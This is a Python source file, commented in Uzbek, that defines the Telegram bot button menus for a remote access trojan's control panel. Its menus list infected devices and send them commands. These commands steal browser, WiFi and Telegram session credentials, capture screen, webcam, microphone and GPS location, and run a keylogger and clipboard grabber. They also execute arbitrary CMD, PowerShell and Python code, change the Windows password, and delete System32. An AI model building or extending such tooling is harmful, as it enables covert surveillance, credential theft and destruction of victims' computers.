# panels.py - v3.1.0 MODERN O'ZBEK UI (Cyberpunk Theme)
"""
Zamonaviy Telegram tugmalar paneli
- Cyberpunk emoji tema
- O'zbek tili
- Mantiqiy guruhlanish
"""
from telethon.tl.custom import Button

# ==================== ASOSIY BOSHQARUV PANELI ====================
admin_panel = [
    [Button.inline("🌐 Universal Boshqaruv", b"universal_panel")],
    [Button.inline("💻 Qurilmalar Ro'yxati", b"device_list"),
     Button.inline("⚡ Tanlangan Qurilma", b"device_panel")],
    [Button.inline("🤖 AI Yordamchi", b"ai_settings"),
     Button.inline("📊 Statistika", b"stats")],
    [Button.inline("🔄 Yangilash", b"update_system"),
     Button.inline("⚙️ Sozlamalar", b"settings")],
]

# ==================== UNIVERSAL PANEL (Barcha qurilmalar) ====================
universal_panel = [
    [Button.inline("🎯 MONITORINQ", b"monitoring_header")],
    [Button.inline("📸 Ekran Rasmi", b"broadcast_screenshot"),
     Button.inline("🎥 Jonli Efir", b"broadcast_live_start")],
    [Button.inline("⏹ Efirni To'xtatish", b"broadcast_live_stop")],
    
    [Button.inline("🔊 OVOZ BOSHQARUVI", b"audio_header")],
    [Button.inline("🔼 Ovoz Oshirish", b"broadcast_vol_up"),
     Button.inline("🔽 Ovoz Kamaytirish", b"broadcast_vol_down")],
    [Button.inline("🔇 Ovozsizlantirish", b"broadcast_mute"),
     Button.inline("🔊 Ovoz Yoqish", b"broadcast_unmute")],
    
    [Button.inline("🔐 MA'LUMOT YIGISH", b"data_header")],
    [Button.inline("🌐 Brauzer Parollari", b"broadcast_browser"),
     Button.inline("📡 WiFi Parollari", b"broadcast_wifi")],
    [Button.inline("💾 Telegram Ma'lumotlari", b"broadcast_tdata")],
    
    [Button.inline("🎬 MEDIA VA AUDIO", b"media_header")],
    [Button.inline("📷 Veb-Kamera", b"broadcast_webcam"),
     Button.inline("🎙 Ovoz Yozish", b"broadcast_audio")],
    
    [Button.inline("💻 TIZIM MA'LUMOTI", b"system_header")],
    [Button.inline("🖥 Tizim Xususiyatlari", b"broadcast_sysinfo"),
     Button.inline("📋 Jarayonlar", b"broadcast_processes")],
    
    [Button.inline("📝 NOTEPAD BOSHQARUVI", b"notepad_header")],
    [Button.inline("📂 Notepad Ochish", b"broadcast_notepad_open"),
     Button.inline("✍️ Yozish Rejimi", b"broadcast_write_start")],
    [Button.inline("⏹ Yozishni To'xtatish", b"broadcast_write_stop")],
    
    [Button.inline("🔙 Asosiy Menyuga", b"back_to_main")],
]

# ==================== TANLANGAN QURILMA PANELI ====================
device_panel = [
    # Media va monitoring
    [Button.inline("📸 Ekran Rasmi", b"screenshot"),
     Button.inline("🎥 Jonli Efir", b"live_start")],
    [Button.inline("⏹ To'xtatish", b"live_stop"),
     Button.inline("📷 Veb-Kamera", b"webcam_photo")],
    
    # Ovoz boshqaruvi
    [Button.inline("🔼 +", b"vol_up"),
     Button.inline("🔽 -", b"vol_down"),
     Button.inline("🔇 Mute", b"mute"),
     Button.inline("🔊 Unmute", b"unmute")],
    
    # Parollar va ma'lumotlar
    [Button.inline("🔐 Parollar", b"browser"),
     Button.inline("📡 WiFi", b"wifi")],
    [Button.inline("💾 Telegram", b"tdata"),
     Button.inline("🔑 WinPass", b"winpass_change")],
    
    # Brauzer va buyruqlar
    [Button.inline("🌐 Brauzer Qidirish", b"browser_search_prompt")],
    [Button.inline("⚡ CMD", b"cmd_prompt"),
     Button.inline("🔷 PowerShell", b"ps_prompt")],
    
    # Joylashuv
    [Button.inline("📍 GPS Joylashuv", b"smart_location")],
    
    # Qo'shimcha
    [Button.inline("🔧 Qo'shimcha", b"advanced_panel"),
     Button.inline("☢️ Xavfli Zona", b"danger_zone")],
    [Button.inline("🔙 Ortga", b"back_to_main")],
]

# ==================== QO'SHIMCHA FUNKSIYALAR ====================
advanced_panel = [
    [Button.inline("⌨️ KEYLOGGER", b"keylogger_section")],
    [Button.inline("⌨️ Keylogger Menyu", b"keylogger_menu")],
    
    [Button.inline("📋 CLIPBOARD", b"clipboard_section")],
    [Button.inline("📋 Clipboard Menyu", b"clipboard_menu")],
    
    [Button.inline("🎬 MEDIA YOZISH", b"media_section")],
    [Button.inline("📷 Veb-Kamera Rasm", b"webcam_photo"),
     Button.inline("🎙 Audio Yozish", b"audio_record")],
    
    [Button.inline("📊 JARAYONLAR", b"processes_section")],
    [Button.inline("📋 Ro'yxat", b"process_list"),
     Button.inline("🔪 O'chirish", b"process_kill_prompt")],
    
    [Button.inline("💾 TIZIM MA'LUMOTI", b"system_section")],
    [Button.inline("💻 Umumiy", b"system_info"),
     Button.inline("💿 Disklar", b"disk_usage")],
    
    [Button.inline("📁 FAYL MENEJERI", b"file_section")],
    [Button.inline("📂 Ko'rish", b"file_explorer"),
     Button.inline("⬇️ Yuklash", b"file_download_prompt")],
    [Button.inline("🗑️ O'chirish", b"file_delete_prompt")],
    
    [Button.inline("🌐 TARMOQ", b"network_section")],
    [Button.inline("📡 Ulanishlar", b"network_connections"),
     Button.inline("📜 Brauzer Tarixi", b"browser_history_chrome")],
    
    [Button.inline("🚀 AVTOYUKLASH", b"startup_section")],
    [Button.inline("📋 Ro'yxat", b"startup_list"),
     Button.inline("📦 Dasturlar", b"programs_list")],
    
    [Button.inline("⚡ TIZIM BOSHQARUVI", b"power_section")],
    [Button.inline("🔌 O'chirish", b"shutdown_prompt"),
     Button.inline("🔄 Qayta Yuklash", b"restart_prompt")],
    [Button.inline("❌ Bekor Qilish", b"shutdown_cancel"),
     Button.inline("🔒 Qulflash", b"lock_screen")],
    
    [Button.inline("🐍 PYTHON KODI", b"python_section")],
    [Button.inline("⚡ Bajarish", b"python_exec_prompt")],
    
    [Button.inline("🔙 Asosiy Menyuga", b"back_to_main")],
]

# ==================== JOYLASHUV PANELI ====================
location_panel = [
    [Button.inline("📍 Joylashuvni Aniqlash", b"smart_location")], # Bitta aqlli tugma
    [Button.inline("📊 Ko'p Tashrif", b"most_visited")],
    [Button.inline("🔙 Ortga", b"back_to_main")],
]

# ==================== KEYLOGGER PANELI ====================
keylogger_panel = [
    [Button.inline("⌨️ KEYLOGGER BOSHQARUVI", b"keylogger_header")],
    [Button.inline("▶️ Boshlash", b"keylogger_start"),
     Button.inline("⏹ To'xtatish", b"keylogger_stop")],
    [Button.inline("📄 Loglarni Ko'rish", b"keylogger_logs"),
     Button.inline("🗑️ Tozalash", b"keylogger_clear")],
    [Button.inline("🔙 Qo'shimcha Menyuga", b"back_to_advanced")],
]

# ==================== CLIPBOARD PANELI ====================
clipboard_panel = [
    [Button.inline("📋 CLIPBOARD BOSHQARUVI", b"clipboard_header")],
    [Button.inline("📖 Matnni Olish", b"clipboard_get")],
    [Button.inline("✍️ Matnni O'rnatish", b"clipboard_set_prompt")],
    [Button.inline("🔙 Qo'shimcha Menyuga", b"back_to_advanced")],
]

# ==================== XAVFLI ZONA ====================
danger_zone_panel = [
    [Button.inline("⚠️ XAVFLI ZONA", b"danger_header")],
    [Button.inline("☢️ System32 O'chirish", b"nuke_system32")],
    [Button.inline("🔙 Ortga", b"back_to_main")],
]

# ==================== TASDIQLASH PANELLARI ====================
nuke_confirm_panel = [
    [Button.inline("⚠️ BU JUDA XAVFLI!", b"warning_header")],
    [Button.inline("✅ HA, O'CHIRISH", b"nuke_confirm")],
    [Button.inline("❌ YO'Q, BEKOR QILISH", b"nuke_cancel")],
]

update_confirm_panel = [
    [Button.inline("🔄 YANGILANISH", b"update_header")],
    [Button.inline("✅ Yangilashni O'rnatish", b"update_confirm")],
    [Button.inline("❌ Bekor Qilish", b"update_cancel")],
]

# ==================== AI SOZLAMALARI ====================
ai_settings_panel = [
    [Button.inline("🤖 AI YORDAMCHI SOZLAMALARI", b"ai_header")],
    [Button.inline("✅ AI Yoqish", b"ai_enable"),
     Button.inline("❌ AI O'chirish", b"ai_disable")],
    [Button.inline("🗑️ Suhbat Tarixini Tozalash", b"ai_clear_history")],
    [Button.inline("📊 AI Holati", b"ai_status")],
    [Button.inline("🔙 Asosiy Menyuga", b"back_to_main")],
]

# ==================== QURILMALAR RO'YXATI ====================
def create_device_list_panel(devices):
    """Dinamik qurilmalar ro'yxati yaratish"""
    buttons = []
    
    if not devices:
        buttons.append([Button.inline("❌ Qurilmalar yo'q", b"no_devices")])
    else:
        for device_id, device in devices.items():
            status = "🟢" if device.get('status') == 'online' else "🔴"
            info = device.get('info', {})
            hostname = info.get('hostname', 'Noma\'lum')[:20]
            username = info.get('username', 'User')[:15]
            
            button_text = f"{status} {hostname} ({username})"
            buttons.append([Button.inline(button_text, f"device_{device_id}".encode())])
    
    buttons.append([Button.inline("🔙 Ortga", b"back_to_main")])
    
    return buttons

# ==================== SOZLAMALAR PANELI ====================
settings_panel = [
    [Button.inline("⚙️ SOZLAMALAR", b"settings_header")],
    [Button.inline("🎨 Til Sozlamalari", b"lang_settings"),
     Button.inline("🔔 Bildirishnomalar", b"notif_settings")],
    [Button.inline("🔐 Xavfsizlik", b"security_settings"),
     Button.inline("📊 Monitoring", b"monitor_settings")],
    [Button.inline("🔙 Asosiy Menyuga", b"back_to_main")],
]

# ==================== STATISTIKA PANELI ====================
def create_stats_panel():
    """Statistika paneli"""
    return [
        [Button.inline("💻 Qurilmalar", b"stats_devices"),
         Button.inline("⚡ Buyruqlar", b"stats_commands")],
        [Button.inline("❌ Xatolar", b"stats_errors"),
         Button.inline("📈 Faollik", b"stats_activity")],
        [Button.inline("🔙 Ortga", b"back_to_main")],
    ]

# ==================== YORDAMCHI FUNKSIYALAR ====================
def get_back_button(target="back_to_main"):
    """Universal orqaga tugmasi"""
    return [Button.inline("🔙 Ortga", target.encode())]

def create_confirmation_panel(message, confirm_action, cancel_action="back_to_main"):
    """Tasdiqlash paneli yaratish"""
    return [
        [Button.inline("⚠️ TASDIQLASH", b"confirm_header")],
        [Button.inline("✅ Ha", confirm_action.encode())],
        [Button.inline("❌ Yo'q", cancel_action.encode())],
    ]

# ==================== EXPORT ====================
__all__ = [
    'admin_panel',
    'universal_panel',
    'device_panel',
    'advanced_panel',
    'location_panel',
    'keylogger_panel',
    'clipboard_panel',
    'danger_zone_panel',
    'nuke_confirm_panel',
    'update_confirm_panel',
    'ai_settings_panel',
    'settings_panel',
    'create_device_list_panel',
    'create_stats_panel',
    'get_back_button',
    'create_confirmation_panel',
]